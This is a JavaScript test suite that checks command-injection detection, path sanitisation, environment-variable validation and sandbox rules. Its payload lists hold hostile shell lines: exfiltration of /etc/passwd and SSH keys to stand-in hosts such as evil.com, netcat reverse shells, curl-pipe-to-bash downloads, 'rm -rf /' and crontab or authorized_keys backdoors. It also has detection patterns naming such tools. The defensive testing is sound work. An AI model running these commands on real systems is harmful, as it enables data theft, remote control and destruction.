/**
 * Security Test Suite: Command Injection Prevention
 * OWASP Compliance: Command Injection Prevention Testing
 */

const { expect } = require('chai');
const sinon = require('sinon');
const { spawn, exec } = require('child_process');

describe('Command Injection Prevention', () => {

  describe('Direct Command Injection Detection', () => {
    const commandInjectionPayloads = [
      // Basic command chaining
      '; cat /etc/passwd',
      '&& rm -rf /',
      '|| wget http://malicious.com/backdoor',
      '| nc -l 4444 -e /bin/sh',

      // Command substitution
      '$(cat /etc/shadow)',
      '`whoami`',
      '${cat /etc/passwd}',
      '$((cat /etc/passwd))',

      // Pipe attacks
      '| curl -X POST http://evil.com -d @/etc/passwd',
      '| base64 /etc/passwd | curl -X POST http://evil.com -d @-',
      '| python -c "import os; os.system(\\"rm -rf /\\")"',

      // Redirection attacks
      '> /tmp/backdoor.sh',
      '>> /etc/crontab',
      '< /etc/passwd',
      '2>&1 | tee /tmp/output.txt',

      // Process substitution
      '<(curl http://malicious.com/script.sh)',
      '>(curl -X POST http://evil.com -T -)',

      // Arithmetic expansion with command execution
      '$(($(cat /etc/passwd | wc -l)))',

      // Parameter expansion attacks
      '${PATH:+$(rm -rf /)}',
      '${HOME:=$(cat /etc/passwd)}',

      // Advanced injection techniques
      ';sleep 10;',
      '&ping -c 4 127.0.0.1&',
      '||echo "injected"||',
      '&&curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)&&',

      // Encoded payloads
      '%3Bcat%20%2Fetc%2Fpasswd',
      'echo%20%22hacked%22%20%3E%20%2Ftmp%2Fpwned',

      // Unicode and special character attacks
      '；cat /etc/passwd', // Unicode semicolon
      '｜nc -l 4444 -e /bin/sh', // Fullwidth vertical bar
      '＆rm -rf /', // Fullwidth ampersand

      // Null byte injection
      'file.txt\x00; cat /etc/passwd',
      'safe_command\0rm -rf /',

      // Environment variable manipulation
      'HOME=/tmp SHELL=/bin/sh /bin/sh',
      'PATH=/tmp:$PATH malicious_binary',

      // Here document attacks
      'cat <<EOF\nmalicious content\nEOF',
      'sh <<< "rm -rf /"',

      // Glob and wildcard attacks
      'rm *',
      'cat /etc/*',
      'ls -la ~/*',

      // Time-based attacks
      'sleep 5 && echo "delayed execution"',
      'timeout 10 curl http://evil.com',

      // Crontab manipulation attempts
      'echo "* * * * * /bin/sh /tmp/backdoor.sh" | crontab -',

      // SSH key manipulation
      'cat ~/.ssh/id_rsa | curl -X POST http://evil.com -T -',
      'echo "malicious_key" >> ~/.ssh/authorized_keys',

      // Docker escape attempts
      'docker run --privileged -v /:/host alpine chroot /host sh',

      // Systemd service manipulation
      'systemctl --user enable malicious.service',

      // Network-based attacks
      'nc evil.com 4444 -e /bin/sh',
      'telnet evil.com 4444 | sh',
      'curl http://evil.com/shell.sh | bash'
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should detect command injection attempt ${index + 1}: ${payload.substring(0, 50)}...`, () => {
        // Comprehensive command injection detection
        const dangerousPatterns = [
          /[;&|`$(){}[\]]/,           // Shell metacharacters
          /\b(rm|cat|curl|wget|nc|telnet|python|perl|ruby|php|node|sh|bash|zsh|fish)\b/i, // Dangerous commands
          /\b(sleep|timeout|ping)\s+\d+/i, // Time-based attacks
          /(\/etc\/|\/bin\/|\/usr\/|\/tmp\/|\/var\/)/i, // System paths
          /(\|\s*base64|\|\s*tee|\|\s*xxd)/i, // Pipe to encoding/output tools
          /(<<|>>>?)/,                // Here documents and redirections
          /(%[0-9a-f]{2})/i,         // URL encoding
          /(；|｜|＆)/,               // Unicode variants
          /\x00/,                     // Null bytes
          /\$\{[^}]*\}/,             // Parameter expansion
          /(crontab|authorized_keys|\.ssh)/i, // System file manipulation
          /(docker|systemctl|sudo)/i  // Privilege escalation
        ];

        const isInjectionAttempt = dangerousPatterns.some(pattern => pattern.test(payload));

        expect(isInjectionAttempt).to.be.true;
        console.log(`Command injection detected: ${payload.substring(0, 80)}...`);
      });
    });
  });

  describe('Safe Command Execution Patterns', () => {
    it('should use parameterized command execution', () => {
      // Example of safe command execution using child_process.spawn
      const safeCommand = 'ls';
      const safeArgs = ['-la', '/home/user'];

      // This is safe because arguments are passed separately
      const mockSpawn = sinon.stub().returns({
        stdout: { on: sinon.stub() },
        stderr: { on: sinon.stub() },
        on: sinon.stub().callsArgWith(1, 0)
      });

      // Validate that command and args are separated
      expect(safeCommand).to.not.include(';');
      expect(safeCommand).to.not.include('|');
      expect(safeCommand).to.not.include('&');

      safeArgs.forEach(arg => {
        expect(arg).to.not.include(';');
        expect(arg).to.not.include('|');
        expect(arg).to.not.include('&');
      });

      console.log(`Safe command execution: ${safeCommand} with args: ${safeArgs.join(' ')}`);
    });

    it('should validate command whitelist', () => {
      const allowedCommands = [
        'ls',
        'cat',
        'grep',
        'find',
        'head',
        'tail',
        'wc',
        'sort',
        'uniq',
        'cut',
        'awk',
        'sed'
      ];

      const testCommands = [
        'ls',           // Allowed
        'cat',          // Allowed
        'rm',           // Not allowed
        'curl',         // Not allowed
        'wget',         // Not allowed
        'nc',           // Not allowed
        'python',       // Not allowed
        'sh',           // Not allowed
        '/bin/bash',    // Not allowed
        'evil_command'  // Not allowed
      ];

      testCommands.forEach(command => {
        const isAllowed = allowedCommands.includes(command);
        console.log(`Command "${command}" is ${isAllowed ? 'ALLOWED' : 'BLOCKED'}`);

        if (['rm', 'curl', 'wget', 'nc', 'python', 'sh', '/bin/bash', 'evil_command'].includes(command)) {
          expect(isAllowed).to.be.false;
        }
      });
    });

    it('should sanitize file paths', () => {
      const dangerousFilePaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        '~/.ssh/id_rsa',
        '/proc/self/environ',
        '/sys/class/net/',
        '\\\\server\\share\\file',
        'file.txt; cat /etc/passwd',
        '/dev/null; rm -rf /',
        '$(cat /etc/passwd)',
        '`whoami`.txt',
        '/tmp/../../../etc/passwd',
        'NUL:',
        'CON:',
        'file\x00.txt'
      ];

      dangerousFilePaths.forEach(filePath => {
        // Path sanitization logic
        const isPathTraversal = /(\.\.|~\/|\\\\|\/etc\/|\/sys\/|\/proc\/)/i.test(filePath);
        const hasCommandInjection = /[;&|`$()]/.test(filePath);
        const hasNullBytes = /\x00/.test(filePath);
        const isWindowsDeviceFile = /^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9]):?$/i.test(filePath);

        const isDangerous = isPathTraversal || hasCommandInjection || hasNullBytes || isWindowsDeviceFile;

        if (isDangerous) {
          console.log(`Dangerous file path blocked: ${filePath}`);
          expect(isDangerous).to.be.true;
        }
      });
    });

    it('should implement argument length limits', () => {
      const maxArgLength = 1000;
      const maxTotalLength = 10000;

      const testArgs = [
        'normal_arg',
        'A'.repeat(maxArgLength + 1), // Too long
        'valid_long_' + 'x'.repeat(500), // Valid long arg
        'B'.repeat(5000) // Very long arg
      ];

      let totalLength = 0;
      testArgs.forEach((arg, index) => {
        const argTooLong = arg.length > maxArgLength;
        totalLength += arg.length;
        const totalTooLong = totalLength > maxTotalLength;

        if (argTooLong || totalTooLong) {
          console.log(`Argument ${index + 1} rejected: length=${arg.length}, total=${totalLength}`);
        }

        if (arg === 'A'.repeat(maxArgLength + 1)) {
          expect(argTooLong).to.be.true;
        }
      });
    });
  });

  describe('Environment Variable Security', () => {
    it('should sanitize environment variables', () => {
      const dangerousEnvVars = {
        'PATH': '/tmp:/bin:/usr/bin', // Potentially dangerous if /tmp is first
        'LD_PRELOAD': 'malicious.so',
        'LD_LIBRARY_PATH': '/tmp/evil',
        'SHELL': '/bin/sh; rm -rf /',
        'HOME': '/tmp/../../../root',
        'IFS': '$\n', // Internal Field Separator manipulation
        'PS1': '$(curl http://evil.com)',
        'PROMPT_COMMAND': 'curl http://evil.com',
        'BASH_ENV': '/tmp/malicious.sh',
        'ENV': '/tmp/evil_profile'
      };

      Object.entries(dangerousEnvVars).forEach(([key, value]) => {
        // Environment variable validation
        const hasDangerousPath = /\/tmp|\.\.\/|malicious/i.test(value);
        const hasCommandInjection = /[;&|`$()]/.test(value);
        const isDangerousVar = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'BASH_ENV', 'ENV'].includes(key);

        const isDangerous = hasDangerousPath || hasCommandInjection || isDangerousVar;

        if (isDangerous) {
          console.log(`Dangerous environment variable blocked: ${key}=${value}`);
          expect(isDangerous).to.be.true;
        }
      });
    });

    it('should validate environment variable names', () => {
      const dangerousVarNames = [
        'PATH/../../../etc', // Path traversal in name
        'VAR;rm -rf /', // Command injection in name
        'TEST`whoami`', // Command substitution in name
        'VAR$(date)', // Command substitution in name
        'TEST=VALUE;export MALICIOUS=1', // Multiple assignments
        '', // Empty name
        '123VAR', // Starting with number
        'VAR@NAME', // Invalid characters
        'VAR NAME', // Space in name
        'VAR\x00TEST' // Null byte
      ];

      dangerousVarNames.forEach(varName => {
        // Valid environment variable name pattern
        const validPattern = /^[a-zA-Z_][a-zA-Z0-9_]*$/;
        const isValid = validPattern.test(varName);

        expect(isValid).to.be.false;
        console.log(`Invalid environment variable name blocked: "${varName}"`);
      });
    });
  });

  describe('Command Output Security', () => {
    it('should sanitize command output for logging', () => {
      const commandOutputs = [
        'Password: secret123',
        'API Key: sk-abc123def456',
        'Token: eyJhbGciOiJIUzI1NiJ9...',
        'mysql://user:password@localhost/db',
        'SSH Key: -----BEGIN PRIVATE KEY-----\nMIIE...',
        'Normal output without secrets',
        'Error: Database connection failed',
        'Connection string: mongodb://admin:pass123@localhost:27017'
      ];

      commandOutputs.forEach((output, index) => {
        // Sanitize sensitive information from logs
        const sanitized = output
          .replace(/password:\s*\S+/gi, 'password: [REDACTED]')
          .replace(/api[_\s]?key:\s*\S+/gi, 'api_key: [REDACTED]')
          .replace(/token:\s*\S+/gi, 'token: [REDACTED]')
          .replace(/\/\/[^:]+:[^@]+@/g, '//[CREDENTIALS_REDACTED]@')
          .replace(/-----BEGIN [^-]+ KEY-----[\s\S]*?-----END [^-]+ KEY-----/gi, '[PRIVATE_KEY_REDACTED]');

        const containsSecrets = output !== sanitized;
        if (containsSecrets) {
          console.log(`Output ${index + 1} sanitized: "${output.substring(0, 30)}..." -> "${sanitized.substring(0, 30)}..."`);
        }
      });
    });

    it('should limit command output size', () => {
      const maxOutputSize = 1024 * 1024; // 1MB limit
      const largeOutput = 'A'.repeat(maxOutputSize + 1000);

      const exceedsLimit = largeOutput.length > maxOutputSize;
      expect(exceedsLimit).to.be.true;

      // Simulate output truncation
      const truncated = largeOutput.substring(0, maxOutputSize) + '\n[OUTPUT TRUNCATED - SIZE LIMIT EXCEEDED]';
      expect(truncated.length).to.be.lessThan(largeOutput.length);

      console.log(`Large output truncated: ${largeOutput.length} -> ${truncated.length} bytes`);
    });
  });

  describe('Process Isolation and Sandboxing', () => {
    it('should implement process isolation', () => {
      const processLimits = {
        maxMemory: 128 * 1024 * 1024, // 128MB
        maxCpuTime: 30, // 30 seconds
        maxFileSize: 10 * 1024 * 1024, // 10MB
        maxProcesses: 10,
        allowedSyscalls: ['read', 'write', 'open', 'close', 'exit']
      };

      // Simulate resource limit enforcement
      const testProcess = {
        memoryUsage: 64 * 1024 * 1024, // 64MB
        cpuTime: 15, // 15 seconds
        fileSize: 5 * 1024 * 1024, // 5MB
        processCount: 5,
        syscalls: ['read', 'write', 'execve'] // Contains non-allowed syscall
      };

      const exceedsMemoryLimit = testProcess.memoryUsage > processLimits.maxMemory;
      const exceedsCpuLimit = testProcess.cpuTime > processLimits.maxCpuTime;
      const exceedsFileLimit = testProcess.fileSize > processLimits.maxFileSize;
      const exceedsProcessLimit = testProcess.processCount > processLimits.maxProcesses;
      const hasDisallowedSyscall = testProcess.syscalls.some(call =>
        !processLimits.allowedSyscalls.includes(call)
      );

      expect(exceedsMemoryLimit).to.be.false;
      expect(exceedsCpuLimit).to.be.false;
      expect(exceedsFileLimit).to.be.false;
      expect(exceedsProcessLimit).to.be.false;
      expect(hasDisallowedSyscall).to.be.true; // execve should not be allowed

      console.log('Process isolation limits enforced successfully');
    });

    it('should implement chroot jail', () => {
      const jailPath = '/tmp/sandbox';
      const allowedPaths = [
        '/tmp/sandbox/bin',
        '/tmp/sandbox/lib',
        '/tmp/sandbox/home/user'
      ];

      const accessAttempts = [
        '/tmp/sandbox/home/user/file.txt', // Allowed
        '/etc/passwd', // Should be blocked (outside jail)
        '/tmp/sandbox/../../../etc/passwd', // Path traversal attempt
        '/proc/self/environ', // System info access attempt
        '/sys/class/net', // Network info access attempt
        '/dev/null' // Device access attempt
      ];

      accessAttempts.forEach(path => {
        // Simulate chroot validation
        const isWithinJail = path.startsWith(jailPath) && !path.includes('..');
        const isSystemPath = /^(\/etc|\/proc|\/sys|\/dev)/.test(path);

        const isAllowed = isWithinJail && !isSystemPath;
        console.log(`Path "${path}" is ${isAllowed ? 'ALLOWED' : 'BLOCKED'} in chroot jail`);

        if (path.includes('/etc/') || path.includes('/../') || isSystemPath) {
          expect(isAllowed).to.be.false;
        }
      });
    });
  });
});